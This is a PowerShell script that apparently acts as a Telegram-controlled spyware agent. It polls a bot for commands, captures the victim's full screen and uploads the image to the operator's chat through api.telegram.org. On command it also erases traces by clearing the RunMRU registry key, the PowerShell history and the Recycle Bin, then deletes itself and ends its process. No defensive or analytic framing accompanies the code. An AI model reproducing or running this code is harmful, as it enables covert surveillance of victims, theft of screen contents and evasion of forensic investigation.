Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$ErrorActionPreference = 'SilentlyContinue'
$APP_TOKEN = $APPTK
$PERMITTED_USERS = $PU  
$ScriptPath = $MyInvocation.MyCommand.Path
$BaseUrl = "https://api.telegram.org/bot$APP_TOKEN"
$Filett = "$env:temp\SC.png"

function Send-Photo {
    param ($ChatId, $FilePath)
    curl.exe -s -X POST "$BaseUrl/sendPhoto" -F "chat_id=$ChatId" -F "photo=@$FilePath" | Out-Null
}

function Send-Message {
    param ($ChatId, $Text)
    curl.exe -s -X POST "$BaseUrl/sendMessage" -d "chat_id=$ChatId" -d "text=$Text" | Out-Null
}

function Take-Screenshot {
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::Png)
}

function Cleanup-And-Exit {
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f | Out-Null
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    Remove-Item $ScriptPath -Force
    Stop-Process -Id $PID
}

$LastUpdateId = 0

while ($true) {
    $Response = curl.exe -s "$BaseUrl/getUpdates?offset=$($LastUpdateId + 1)"
    $Updates = ($Response | ConvertFrom-Json).result

    foreach ($Update in $Updates) {
        $LastUpdateId = $Update.update_id
        $Message = $Update.message
        if (-not $Message) { continue }

        $UserId = $Message.from.id
        $ChatId = $Message.chat.id
        $Text = $Message.text

        if ($PERMITTED_USERS -notcontains $UserId) { continue }

        switch ($Text) {
            "/screenshot" {
                Take-Screenshot
                Send-Photo -ChatId $ChatId -FilePath $Filett
                Remove-Item $Filett -Force
            }
            "/terminate" {
                Cleanup-And-Exit
            }
        }
    }

    Start-Sleep -Milliseconds 1500
}